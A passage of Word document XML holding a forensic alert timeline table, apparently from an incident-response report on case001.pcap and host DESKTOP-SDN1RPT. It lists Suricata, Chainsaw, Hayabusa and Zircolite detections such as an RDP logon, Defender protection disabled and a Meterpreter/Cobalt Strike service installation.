              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#89</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>ET INFO PE EXE or DLL Windows file download HTTP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>10.42.85.115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>http</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2018959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1761862551911401</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#443</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:50.282950</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10.42.85.115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>failed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2025644</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>362176288604783</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#446</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 02:56:38.758942</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10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>failed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2025644</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1730301102209281</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#452</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:23.009739</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>User Authentication Succeeded</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1149</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#42</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>RDP logon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Security</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2125</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#92</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45.247000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Windows Defender Threat Detection Disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#781</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45.247000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</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DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#782</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45.247925</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</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DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Microsoft-Windows-Windows Defender/Operational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#69</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:45.247925</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Windows Defender Real-time Protection Disabled</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Microsoft-Windows-Windows Defender/Operational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>5001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>zircolite/zircolite_timeline_0.jsonl#215</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suspicious Service Path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1320</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation - System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1342</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Meterpreter or Cobalt Strike Getsystem Service Installation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>System</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#103</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
